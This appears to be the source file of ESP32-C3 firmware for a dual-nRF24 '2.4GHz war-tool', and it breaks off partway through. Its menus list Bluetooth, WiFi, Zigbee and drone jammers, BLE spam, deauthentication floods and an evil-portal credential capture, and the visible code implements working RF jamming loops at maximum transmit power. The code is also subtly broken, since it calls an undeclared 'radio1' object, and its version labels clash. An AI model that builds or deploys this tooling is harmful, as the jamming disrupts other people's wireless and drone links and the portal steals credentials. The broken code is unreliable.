/**************************************************************
 * UTS-JAM v5.1 ULTIMATE – ESP32-C3 FULL PACK
 * Educational use only. Use only on your own hardware.
 *
 * Build: ESP32C3 Dev Module / 4MB no spiffs / PSRAM off
 * Libs: RF24 (TMRh20), Adafruit SSD1306 + GFX, U8g2_for_Adafruit_GFX
 **************************************************************/

#include "RF24.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BLEAdvertisedDevice.h>
#include <BLEClient.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEUtils.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <SPI.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <WebServer.h>
#include <WiFi.h>
#include <Wire.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <esp_task_wdt.h>
#include <math.h>
#include <vector>
#include <map>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"

// ============================================================
// PIN DEFINITIONS
// ============================================================
#define SDA_PIN 8
#define SCL_PIN 9
#define SCREEN_WIDTH  128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SSD1306_I2C_ADDRESS 0x3C

#define LED_PIN 10
#define UP_BUTTON_PIN 2
#define DOWN_BUTTON_PIN 0
#define SELECT_BUTTON_PIN 1

#define SPI_SCK  4
#define SPI_MISO 5
#define SPI_MOSI 6
#define RADIO1_CE  20
#define RADIO1_CSN 21
#define RADIO2_CE  7
#define RADIO2_CSN 10

// ============================================================
// OBJECTS
// ============================================================
SPIClass spiBus(FSPI);
RF24 radio(RADIO1_CE, RADIO1_CSN, 4000000);
RF24 radio2(RADIO2_CE, RADIO2_CSN, 4000000);

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;

DNSServer dnsServer;
WiFiServer webServer(80);
String capturedCredentials = "";

bool radio1Active = false;
bool radio2Active = false;

Preferences prefs;
uint8_t brightness = 255;
bool stealthMode = false;

// ============================================================
// APP STATE
// ============================================================
enum AppState {
  STATE_MENU,
  STATE_SUBMENU_JAMMERS, STATE_SUBMENU_ANALYZERS, STATE_SUBMENU_ATTACKS,
  STATE_SUBMENU_TOOLS, STATE_SUBMENU_GAMES, STATE_SUBMENU_SETTINGS,
  STATE_SETTINGS, STATE_HELP,
  STATE_BT_JAM, STATE_DRONE_JAM, STATE_WIFI_JAM, STATE_MULTI_JAM,
  STATE_SWEEP_JAM, STATE_CHANNEL_RANGE, STATE_CW_JAMMER, STATE_ZIGBEE_JAM,
  STATE_BLE_TARGET_JAM, STATE_CUSTOM_HOPPER, STATE_NOISE_GEN,
  STATE_SPECTRUM_WIFI, STATE_SPECTRUM_BLE, STATE_RF_ANALYZER,
  STATE_WIFI_ANALYZER, STATE_PACKET_COUNTER, STATE_WIFI_SNIFFER, STATE_SIGNAL_METER,
  STATE_BLE_SPAM, STATE_APPLE_JUICE, STATE_SWIFT_PAIR, STATE_FAST_PAIR,
  STATE_RICKROLL_BEACON, STATE_BLE_BADUSB,
  STATE_WIFI_DEAUTH, STATE_WIFI_BEACON_FLOOD, STATE_PROBE_FLOOD, STATE_EVIL_PORTAL,
  STATE_ROGUE_AP_DETECT, STATE_NRF24_INJECTOR, STATE_DEAUTH_DETECT, STATE_WIDS,
  STATE_BLE_SCANNER, STATE_BLE_GATT_EXPLORER, STATE_BLE_TRACKER, STATE_MOUSE_SNIFFER,
  STATE_RF_REPEATER, STATE_RF_REPLAY, STATE_RF_OSCILLOSCOPE,
  STATE_TEST_RADIOS, STATE_SYSTEM_INFO,
  STATE_DOOM_GAME, STATE_DINO_GAME, STATE_FLAPPY_GAME, STATE_SNAKE_GAME,
  STATE_TICTACTOE, STATE_PONG, STATE_HUNT_GAME, STATE_SIMON_GAME,
  STATE_MEMORY_GAME, STATE_INVADERS,
  STATE_CALCULATOR, STATE_RESISTOR_CALC, STATE_WIFI_MONITOR,
  STATE_CLI, STATE_WEB_DASHBOARD, STATE_DUCKY_INJECTOR, STATE_LOCK
};
AppState currentState = STATE_MENU;

// ============================================================
// ICONS
// ============================================================
static const uint8_t PROGMEM icon_bt[]       = {0x00,0x46,0x6e,0x3e,0x1c,0x3e,0x6e,0x46};
static const uint8_t PROGMEM icon_drone[]    = {0x18,0x3c,0x5a,0xff,0x7e,0x3c,0x24,0x24};
static const uint8_t PROGMEM icon_wifi[]     = {0x00,0x3e,0x41,0x1c,0x22,0x08,0x14,0x00};
static const uint8_t PROGMEM icon_multi[]    = {0x55,0xaa,0x55,0xaa,0x55,0xaa,0x55,0xaa};
static const uint8_t PROGMEM icon_sweep[]    = {0x00,0x02,0x06,0x8e,0xfe,0x7e,0x30,0x00};
static const uint8_t PROGMEM icon_chrange[]  = {0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00};
static const uint8_t PROGMEM icon_spectrum[] = {0x18,0x18,0x24,0x24,0x42,0x5a,0x99,0x00};
static const uint8_t PROGMEM icon_ble_spec[] = {0x00,0x08,0x2a,0x1c,0x1c,0x2a,0x08,0x00};
static const uint8_t PROGMEM icon_spam[]     = {0x00,0x7e,0x46,0x4a,0x52,0x62,0x7e,0x00};
static const uint8_t PROGMEM icon_deauth[]   = {0x00,0x5e,0x62,0x5e,0x70,0x40,0x7e,0x00};
static const uint8_t PROGMEM icon_scanner[]  = {0x00,0x3c,0x5a,0x5a,0x66,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_zigbee[]   = {0x18,0x24,0x5a,0xdb,0x5a,0x24,0x18,0x00};
static const uint8_t PROGMEM icon_target[]   = {0x18,0x24,0x42,0x5a,0x42,0x24,0x18,0x00};
static const uint8_t PROGMEM icon_beacon[]   = {0x10,0x10,0x38,0x38,0x7c,0x7c,0xfe,0xfe};
static const uint8_t PROGMEM icon_analyzer[] = {0x00,0x1c,0x22,0x22,0x1c,0x08,0x3e,0x00};
static const uint8_t PROGMEM icon_detect[]   = {0x00,0x3c,0x5e,0xff,0xff,0x5e,0x3c,0x00};
static const uint8_t PROGMEM icon_radio[]    = {0x00,0x3c,0x42,0x99,0xa5,0x81,0x7e,0x00};
static const uint8_t PROGMEM icon_settings[] = {0x18,0x3c,0x5a,0xff,0x5a,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_help[]     = {0x3c,0x42,0x42,0x4c,0x48,0x00,0x18,0x00};
static const uint8_t PROGMEM icon_portal[]   = {0x3c,0x42,0x99,0xa5,0xa5,0x99,0x42,0x3c};
static const uint8_t PROGMEM icon_doom[]     = {0x00,0x7e,0x5a,0xdb,0xdb,0x5a,0x7e,0x00};
static const uint8_t PROGMEM icon_calc[]     = {0x7e,0x40,0x5e,0x52,0x52,0x5e,0x00,0x00};
static const uint8_t PROGMEM icon_resistor[] = {0x08,0x7f,0x08,0x3e,0x41,0x00,0x7f,0x00};
static const uint8_t PROGMEM icon_monitor[]  = {0x7c,0x44,0x28,0x10,0x28,0x44,0x7c,0x00};
static const uint8_t PROGMEM icon_snake[]    = {0x00,0x3c,0x42,0x52,0x4a,0x3c,0x00,0x00};
static const uint8_t PROGMEM icon_packet[]   = {0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00,0x00};
static const uint8_t PROGMEM icon_wids[]     = {0x3c,0x42,0x5a,0x5a,0x5a,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_rf_ana[]   = {0x0e,0x11,0x20,0x40,0x20,0x11,0x0e,0x00};
static const uint8_t PROGMEM icon_gatt[]     = {0x3c,0x42,0x81,0xbd,0x81,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_tracker[]  = {0x18,0x3c,0x5a,0xff,0xdb,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_mouse[]    = {0x30,0x28,0x24,0x22,0x21,0x00,0x18,0x00};
static const uint8_t PROGMEM icon_repeater[] = {0x00,0x42,0x66,0x3c,0x3c,0x66,0x42,0x00};
static const uint8_t PROGMEM icon_oscillo[]  = {0x00,0x44,0x28,0x10,0x28,0x44,0x00,0x00};
static const uint8_t PROGMEM icon_badusb[]   = {0x3c,0x42,0x5a,0x5a,0x42,0x3c,0x18,0x18};
static const uint8_t PROGMEM icon_sniffer[]  = {0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x18,0x18};
static const uint8_t PROGMEM icon_cw[]       = {0x18,0x18,0x18,0xff,0xff,0x18,0x18,0x18};
static const uint8_t PROGMEM icon_tictactoe[]= {0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00};
static const uint8_t PROGMEM icon_pong[]     = {0x18,0x18,0x7e,0x7e,0x7e,0x18,0x18,0x00};
static const uint8_t PROGMEM icon_probe[]    = {0x10,0x38,0x7c,0x38,0x10,0x00,0x10,0x00};
static const uint8_t PROGMEM icon_hopper[]   = {0x08,0x1c,0x3e,0x7f,0x3e,0x1c,0x08,0x00};
static const uint8_t PROGMEM icon_noise[]    = {0x55,0x00,0xaa,0x00,0x55,0x00,0xaa,0x00};
static const uint8_t PROGMEM icon_signal[]   = {0x00,0x10,0x10,0x28,0x28,0x44,0x44,0x00};
static const uint8_t PROGMEM icon_system[]   = {0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00,0x00};
static const uint8_t PROGMEM icon_lock[]     = {0x3c,0x42,0x5a,0x5a,0x42,0x3c,0x18,0x18};
static const uint8_t PROGMEM icon_wumpus[]   = {0x3c,0x42,0x99,0xa5,0x81,0x42,0x3c,0x00};
static const uint8_t PROGMEM icon_simon[]    = {0x18,0x3c,0x5a,0xff,0x5a,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_memory[]   = {0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00};
static const uint8_t PROGMEM icon_invaders[] = {0x18,0x3c,0x7e,0xdb,0x7e,0x3c,0x18,0x00};
static const uint8_t PROGMEM icon_dino[]     = {0x07,0x0f,0x0e,0x1f,0x3f,0x2e,0x2c,0x00};
static const uint8_t PROGMEM icon_flappy[]   = {0x1c,0x3e,0x7f,0x6b,0x7f,0x3e,0x1c,0x00};
static const uint8_t PROGMEM icon_cli[]      = {0x00,0x7e,0x42,0x5a,0x42,0x7e,0x00,0x00};
static const uint8_t PROGMEM icon_web[]      = {0x00,0x3e,0x41,0x5d,0x41,0x3e,0x00,0x00};

// ============================================================
// MAIN MENU
// ============================================================
enum MainMenuItem {
  MENU_JAMMERS, MENU_ANALYZERS, MENU_ATTACKS, MENU_TOOLS,
  MENU_GAMES, MENU_SETTINGS, MENU_HELP, MENU_CLI, MENU_LOCK,
  NUM_MAIN_ITEMS
};
const char *mainMenuLabels[NUM_MAIN_ITEMS] = {
  "Jammers", "Analyzers", "Attacks", "Tools",
  "Games", "Settings", "Help", "CLI", "Lock"
};
const uint8_t *const mainMenuIcons[NUM_MAIN_ITEMS] PROGMEM = {
  icon_multi, icon_spectrum, icon_deauth, icon_scanner,
  icon_doom, icon_settings, icon_help, icon_cli, icon_lock
};
int firstVisibleMain = 0;
MainMenuItem selectedMain = MENU_JAMMERS;

// ============================================================
// SUBMENUS
// ============================================================
struct SubMenuItem { const char *label; const uint8_t *icon; AppState targetState; };
struct SubMenu { const char *title; std::vector<SubMenuItem> items; };

SubMenu subJammers = { "Jammers", {
  {"BT Jam",    icon_bt,      STATE_BT_JAM},
  {"DroneJam",  icon_drone,   STATE_DRONE_JAM},
  {"WiFiJam",   icon_wifi,    STATE_WIFI_JAM},
  {"MultiJam",  icon_multi,   STATE_MULTI_JAM},
  {"SweepJam",  icon_sweep,   STATE_SWEEP_JAM},
  {"ChRange",   icon_chrange, STATE_CHANNEL_RANGE},
  {"CW Jammer", icon_cw,      STATE_CW_JAMMER},
  {"ZigbeeJam", icon_zigbee,  STATE_ZIGBEE_JAM},
  {"TargJam",   icon_target,  STATE_BLE_TARGET_JAM},
  {"Hopper",    icon_hopper,  STATE_CUSTOM_HOPPER},
  {"NoiseGen",  icon_noise,   STATE_NOISE_GEN},
  {"Back",      icon_system,  STATE_MENU}
}};

SubMenu subAnalyzers = { "Analyzers", {
  {"WiFiSpec",  icon_spectrum, STATE_SPECTRUM_WIFI},
  {"BLESpec",   icon_ble_spec, STATE_SPECTRUM_BLE},
  {"RFAnalyz",  icon_rf_ana,   STATE_RF_ANALYZER},
  {"WiFiAnaly", icon_analyzer, STATE_WIFI_ANALYZER},
  {"PktCount",  icon_packet,   STATE_PACKET_COUNTER},
  {"WiFiSnif",  icon_sniffer,  STATE_WIFI_SNIFFER},
  {"SigMeter",  icon_signal,   STATE_SIGNAL_METER},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subAttacks = { "Attacks", {
  {"BLESpam",   icon_spam,     STATE_BLE_SPAM},
  {"SourApple", icon_spam,     STATE_APPLE_JUICE},
  {"SwiftPair", icon_badusb,   STATE_SWIFT_PAIR},
  {"FastPair",  icon_spam,     STATE_FAST_PAIR},
  {"Rickroll",  icon_beacon,   STATE_RICKROLL_BEACON},
  {"BLEBadUSB", icon_badusb,   STATE_BLE_BADUSB},
  {"Deauth",    icon_deauth,   STATE_WIFI_DEAUTH},
  {"Beacon",    icon_beacon,   STATE_WIFI_BEACON_FLOOD},
  {"ProbeFld",  icon_probe,    STATE_PROBE_FLOOD},
  {"EvilPort",  icon_portal,   STATE_EVIL_PORTAL},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subTools = { "Tools", {
  {"BLEScan",   icon_scanner,  STATE_BLE_SCANNER},
  {"BLE GATT",  icon_gatt,     STATE_BLE_GATT_EXPLORER},
  {"BLETrack",  icon_tracker,  STATE_BLE_TRACKER},
  {"MouseSnf",  icon_mouse,    STATE_MOUSE_SNIFFER},
  {"Repeater",  icon_repeater, STATE_RF_REPEATER},
  {"RF Replay", icon_repeater, STATE_RF_REPLAY},
  {"DuckyInj",  icon_badusb,   STATE_DUCKY_INJECTOR},
  {"Oscillosc", icon_oscillo,  STATE_RF_OSCILLOSCOPE},
  {"RogueAPD",  icon_detect,   STATE_ROGUE_AP_DETECT},
  {"NRF24Inj",  icon_radio,    STATE_NRF24_INJECTOR},
  {"DeauthDet", icon_detect,   STATE_DEAUTH_DETECT},
  {"WIDS",      icon_wids,     STATE_WIDS},
  {"WebDash",   icon_web,      STATE_WEB_DASHBOARD},
  {"TestRadio", icon_radio,    STATE_TEST_RADIOS},
  {"SysInfo",   icon_system,   STATE_SYSTEM_INFO},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subGames = { "Games", {
  {"DOOM 3D",   icon_doom,     STATE_DOOM_GAME},
  {"Dino Run",  icon_dino,     STATE_DINO_GAME},
  {"FlappyBird",icon_flappy,   STATE_FLAPPY_GAME},
  {"Snake",     icon_snake,    STATE_SNAKE_GAME},
  {"TicTacToe", icon_tictactoe,STATE_TICTACTOE},
  {"Pong",      icon_pong,     STATE_PONG},
  {"Hunt",      icon_wumpus,   STATE_HUNT_GAME},
  {"Simon",     icon_simon,    STATE_SIMON_GAME},
  {"Memory",    icon_memory,   STATE_MEMORY_GAME},
  {"Invaders",  icon_invaders, STATE_INVADERS},
  {"Back",      icon_system,   STATE_MENU}
}};

SubMenu subSettings = { "Settings", {
  {"Brightness", icon_settings, STATE_SETTINGS},
  {"Calc",       icon_calc,     STATE_CALCULATOR},
  {"Resistor",   icon_resistor, STATE_RESISTOR_CALC},
  {"WiFiMon",    icon_monitor,  STATE_WIFI_MONITOR},
  {"Sys Info",   icon_system,   STATE_SYSTEM_INFO},
  {"Reset WiFi", icon_radio,    STATE_TEST_RADIOS},
  {"Back",       icon_system,   STATE_MENU}
}};

SubMenu *currentSubMenu = nullptr;
int subFirstVisible = 0;
int subSelectedIndex = 0;

// ============================================================
// FORWARD DECLARATIONS (kritik - Arduino prototipleri bunları kaçırabilir)
// ============================================================
void executeState(AppState st);
void drawMainMenu();
void drawSubMenu();
void handleMainMenu();
void handleSubMenu();
void initRadios();
void stopRadios();
void recoverFromWiFi();
void setBrightness(uint8_t val);
void safeDelay(unsigned long ms);
void displayInfo(String t, String a = "", String b = "", String c = "");
void drawHeader(const char *title);
void drawHeader(const String &title);
bool gameShouldExit();
void drawExitProgress();
bool checkGameExit();

// ============================================================
// BUTTON HANDLING (independent edge detection)
// ============================================================
bool lastUp = HIGH, lastDown = HIGH, lastSel = HIGH;
unsigned long lastBtnTime = 0;

bool upPressed() {
  bool cur = digitalRead(UP_BUTTON_PIN);
  if (lastUp && !cur && (millis() - lastBtnTime > 60)) {
    lastUp = cur; lastBtnTime = millis();
    if (!stealthMode) digitalWrite(LED_PIN, HIGH);
    return true;
  }
  if (cur) lastUp = HIGH;
  return false;
}
bool downPressed() {
  bool cur = digitalRead(DOWN_BUTTON_PIN);
  if (lastDown && !cur && (millis() - lastBtnTime > 60)) {
    lastDown = cur; lastBtnTime = millis();
    if (!stealthMode) digitalWrite(LED_PIN, HIGH);
    return true;
  }
  if (cur) lastDown = HIGH;
  return false;
}
bool selPressed() {
  bool cur = digitalRead(SELECT_BUTTON_PIN);
  if (lastSel && !cur && (millis() - lastBtnTime > 60)) {
    lastSel = cur; lastBtnTime = millis();
    if (!stealthMode) digitalWrite(LED_PIN, HIGH);
    return true;
  }
  if (cur) { lastSel = HIGH; if (!stealthMode) digitalWrite(LED_PIN, LOW); }
  return false;
}

// ============================================================
// HELPERS
// ============================================================
void safeDelay(unsigned long ms) {
  unsigned long start = millis();
  while (millis() - start < ms) {
    esp_task_wdt_reset();
    yield();
  }
}

// ============================================================
// GLOBAL EXIT & 5-SECOND SELECT PROGRESS TRACKER
// ============================================================
unsigned long g_gameSelHoldStart = 0;

bool gameShouldExit() {
  bool isPressed = (digitalRead(SELECT_BUTTON_PIN) == LOW);
  if (isPressed) {
    if (g_gameSelHoldStart == 0) {
      g_gameSelHoldStart = millis();
    }
    unsigned long heldMs = millis() - g_gameSelHoldStart;
    if (heldMs >= 5000) {
      g_gameSelHoldStart = 0;
      while (digitalRead(SELECT_BUTTON_PIN) == LOW) {
        safeDelay(10);
      }
      safeDelay(80);
      return true;
    }
  } else {
    g_gameSelHoldStart = 0;
  }
  return false;
}

void drawExitProgress() {
  if (g_gameSelHoldStart > 0 && digitalRead(SELECT_BUTTON_PIN) == LOW) {
    unsigned long heldMs = millis() - g_gameSelHoldStart;
    if (heldMs >= 350) {
      int barW = map(heldMs, 350, 5000, 0, 74);
      barW = constrain(barW, 0, 74);
      int remainSec = (5000 - heldMs + 999) / 1000;
      
      display.fillRect(22, 16, 84, 32, SSD1306_BLACK);
      display.drawRect(22, 16, 84, 32, SSD1306_WHITE);
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(28, 20);
      display.print("EXIT IN: ");
      display.print(remainSec);
      display.print("s");
      
      display.drawRect(27, 34, 74, 8, SSD1306_WHITE);
      display.fillRect(27, 34, barW, 8, SSD1306_WHITE);
    }
  }
}

bool checkGameExit() {
  drawExitProgress();
  return gameShouldExit();
}

void setBrightness(uint8_t val) {
  brightness = val;
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(brightness);
}

void displayInfo(String t, String a, String b, String c) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);  display.println(t);
  if (a != "") { display.setCursor(0, 14); display.println(a); }
  if (b != "") { display.setCursor(0, 28); display.println(b); }
  if (c != "") { display.setCursor(0, 42); display.println(c); }
  display.display();
}

void drawHeader(const char *title) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(2, 1);
  display.print(title);

  // Status badges on top-right HUD:
  // Radio 1 badge
  if (radio1Active) {
    display.fillRect(66, 1, 10, 8, SSD1306_BLACK);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(68, 1);
    display.print("1");
    display.setTextColor(SSD1306_BLACK);
  }
  // Radio 2 badge
  if (radio2Active) {
    display.fillRect(78, 1, 10, 8, SSD1306_BLACK);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(80, 1);
    display.print("2");
    display.setTextColor(SSD1306_BLACK);
  }
  // Stealth mode badge (S)
  if (stealthMode) {
    display.fillRect(90, 1, 8, 8, SSD1306_BLACK);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(92, 1);
    display.print("S");
    display.setTextColor(SSD1306_BLACK);
  }
  // Antenna / Signal icon at (102, 1)
  display.drawLine(103, 7, 107, 7, SSD1306_BLACK);
  display.drawLine(105, 7, 105, 3, SSD1306_BLACK);
  display.drawLine(103, 3, 105, 5, SSD1306_BLACK);
  display.drawLine(107, 3, 105, 5, SSD1306_BLACK);

  // Battery icon at (114, 2)
  display.drawRect(114, 2, 10, 6, SSD1306_BLACK);
  display.drawFastVLine(124, 3, 4, SSD1306_BLACK);
  display.fillRect(116, 3, 6, 4, SSD1306_BLACK);

  display.setTextColor(SSD1306_WHITE);
}
// String overload - bu hata #1'i çözer
void drawHeader(const String &title) {
  drawHeader(title.c_str());
}

void drawScrollbar(int sel, int total, int top, int h) {
  if (total <= 4) return;
  int barH = max(3, h * 4 / total);
  int barY = top + (h - barH) * sel / max(1, total - 1);
  display.fillRect(SCREEN_WIDTH - 2, top, 2, h, SSD1306_BLACK);
  display.drawFastVLine(SCREEN_WIDTH - 1, top, h, SSD1306_WHITE);
  display.fillRect(SCREEN_WIDTH - 2, barY, 2, barH, SSD1306_WHITE);
}

// ============================================================
// SPLASH & CYBER LOGO
// ============================================================
static const unsigned char PROGMEM logo_cyberdeck[128] = {
  0x00,0x07,0xe0,0x00, 0x00,0x1f,0xf8,0x00, 0x00,0x7f,0xfe,0x00, 0x00,0xff,0xff,0x00,
  0x01,0xf8,0x1f,0x80, 0x03,0xe0,0x07,0xc0, 0x07,0xc0,0x03,0xe0, 0x0f,0x8f,0xf1,0xf0,
  0x0f,0x1f,0xf8,0xf0, 0x1e,0x3c,0x3c,0x78, 0x1e,0x78,0x1e,0x78, 0x3c,0x70,0x0e,0x3c,
  0x3c,0x60,0x06,0x3c, 0x3c,0x67,0xe6,0x3c, 0x3c,0x6f,0xf6,0x3c, 0x3c,0x7f,0xfe,0x3c,
  0x3c,0x3f,0xfc,0x3c, 0x3c,0x1f,0xf8,0x3c, 0x1e,0x0f,0xf0,0x78, 0x1e,0x00,0x00,0x78,
  0x0f,0x1b,0xd8,0xf0, 0x0f,0x1b,0xd8,0xf0, 0x07,0x9b,0xd9,0xe0, 0x03,0xdb,0xdb,0xc0,
  0x01,0xff,0xff,0x80, 0x00,0xff,0xff,0x00, 0x00,0x76,0x6e,0x00, 0x00,0x36,0x6c,0x00,
  0x00,0x1f,0xf8,0x00, 0x00,0x0f,0xf0,0x00, 0x00,0x07,0xe0,0x00, 0x00,0x00,0x00,0x00
};

void splashScreen() {
  // Stage 1: CRT Glitch Scanlines
  for (int y = 0; y < 64; y += 4) {
    display.clearDisplay();
    display.drawFastHLine(0, y, 128, SSD1306_WHITE);
    display.drawFastHLine(0, 63 - y, 128, SSD1306_WHITE);
    display.display();
    if (digitalRead(UP_BUTTON_PIN) == LOW || digitalRead(DOWN_BUTTON_PIN) == LOW || digitalRead(SELECT_BUTTON_PIN) == LOW) return;
    delay(10);
  }

  // Stage 2: 32x32 Cyber Logo & Title Banner
  display.clearDisplay();
  display.drawBitmap(6, 16, logo_cyberdeck, 32, 32, SSD1306_WHITE);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(44, 14);
  display.print("UTS CYBER-DECK");
  display.drawFastHLine(44, 24, 80, SSD1306_WHITE);
  display.setCursor(44, 28);
  display.print("v5.3 ULTIMATE");
  display.setCursor(44, 38);
  display.print("2.4GHz WAR-TOOL");
  display.setCursor(44, 48);
  display.print("ESP32-C3 RISC-V");
  display.display();

  for (int i = 0; i < 20; i++) {
    if (digitalRead(UP_BUTTON_PIN) == LOW || digitalRead(DOWN_BUTTON_PIN) == LOW || digitalRead(SELECT_BUTTON_PIN) == LOW) return;
    safeDelay(50);
  }

  // Stage 3: High-Tech Hardware Self-Test
  const char* checks[] = {
    "CPU: ESP32 160MHz",
    "MEM: 400KB SRAM",
    "RF1: NRF24+PA+LNA",
    "RF2: NRF24+PA+LNA"
  };
  for (int c = 0; c < 4; c++) {
    display.clearDisplay();
    display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(2, 1);
    display.print("HARDWARE SELF-TEST");
    display.setTextColor(SSD1306_WHITE);

    for (int j = 0; j <= c; j++) {
      display.setCursor(2, 14 + j * 10);
      display.print("[OK] ");
      display.print(checks[j]);
    }

    display.drawRect(2, 54, 124, 7, SSD1306_WHITE);
    display.fillRect(4, 56, (c + 1) * 30, 3, SSD1306_WHITE);
    display.display();

    digitalWrite(LED_PIN, HIGH);
    safeDelay(60);
    digitalWrite(LED_PIN, LOW);
    safeDelay(90);
    if (digitalRead(UP_BUTTON_PIN) == LOW || digitalRead(DOWN_BUTTON_PIN) == LOW || digitalRead(SELECT_BUTTON_PIN) == LOW) return;
  }

  // Stage 4: "SYSTEM READY" confirmation
  display.clearDisplay();
  display.drawBitmap(12, 16, logo_cyberdeck, 32, 32, SSD1306_WHITE);
  display.setCursor(50, 20);
  display.print("ALL SYSTEMS");
  display.setCursor(50, 32);
  display.print(">> ONLINE <<");
  display.drawRect(50, 44, 70, 7, SSD1306_WHITE);
  display.fillRect(52, 46, 66, 3, SSD1306_WHITE);
  display.display();
  safeDelay(400);
}

// ============================================================
// RADIO INIT / STOP
// ============================================================
void initRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
  safeDelay(100);
  spiBus.end();
  spiBus.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
  safeDelay(200);

  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);

  bool r1ok = false;
  for (int i = 0; i < 6; i++) {
    if (radio.begin(&spiBus)) { r1ok = true; break; }
    safeDelay(200);
  }
  if (r1ok) {
    radio1Active = true;
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio1: OK");
  } else {
    radio1Active = false;
    display.println("Radio1: FAIL");
  }

  bool r2ok = false;
  for (int i = 0; i < 6; i++) {
    if (radio2.begin(&spiBus)) { r2ok = true; break; }
    safeDelay(200);
  }
  if (r2ok) {
    radio2Active = true;
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio2: OK");
  } else {
    radio2Active = false;
    display.println("Radio2: FAIL");
  }
  display.display();
  safeDelay(900);
}

void stopRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
  radio.stopListening();
  radio2.stopListening();
}

void recoverFromWiFi() {
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  safeDelay(600);
  initRadios();
}

// ============================================================
// JAMMER FUNCTIONS v6.0 (MAX DISRUPTION — BUG-FIXED)
// Kritik: jamPrepareRadios() ile openWritingPipe açılır
// ============================================================

static uint8_t jamBuf[32];
static const uint8_t jamAddr[3] = {0xE7, 0xE7, 0xE7};

// Tüm jammer'lar için ortak hazırlık. writeFast'in çalışması için ZORUNLU.
void jamPrepareRadios() {
  for (int i = 0; i < 32; i++) jamBuf[i] = random(256);
  if (radio1Active) {
    radio1.stopConstCarrier();
    radio1.stopListening();
    radio1.setAutoAck(false);
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.setAddressWidth(3);
    radio1.setPayloadSize(32);
    radio1.openWritingPipe(jamAddr);
  }
  if (radio2Active) {
    radio2.stopConstCarrier();
    radio2.stopListening();
    radio2.setAutoAck(false);
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setAddressWidth(3);
    radio2.setPayloadSize(32);
    radio2.openWritingPipe(jamAddr);
  }
}

// BT Jammer — BLE adv (37/38/39) + BT classic tüm kanallar
// nRF ch: 2=BLe37, 26=BLE38, 80=BLE39 (adv), diğerleri BT classic
void btJam() {
  static int idx = 0;
  // BLE adv öncelikli + BT classic geniş spektrum
  const int btCh[] = {2, 26, 80, 4, 10, 18, 28, 44, 60, 72};
  int nrf = btCh[idx];
  idx = (idx + 1) % 10;
  if (radio1Active) {
    radio1.setChannel(nrf);
    delayMicroseconds(60);
    radio1.writeFast(jamBuf, 32);
  }
  if (radio2Active) {
    radio2.setChannel((nrf + 1) % 84);
    delayMicroseconds(60);
    radio2.writeFast(jamBuf, 32);
  }
  // Her 16 adımda FIFO boşalt
  static int flush = 0;
  if ((++flush & 0x0F) == 0) {
    if (radio1Active) radio1.txStandBy(0, true);
    if (radio2Active) radio2.txStandBy(0, true);
  }
}

// Drone Jammer — 2400–2483 MHz full sweep (drone kontrol bandı)
void droneJam() {
  static int ch = 0;
  if (radio1Active) {
    radio1.setChannel(ch);
    delayMicroseconds(60);
    radio1.writeFast(jamBuf, 32);
  }
  if (radio2Active) {
    int ch2 = (ch + 63) % 126; // 180° out of phase
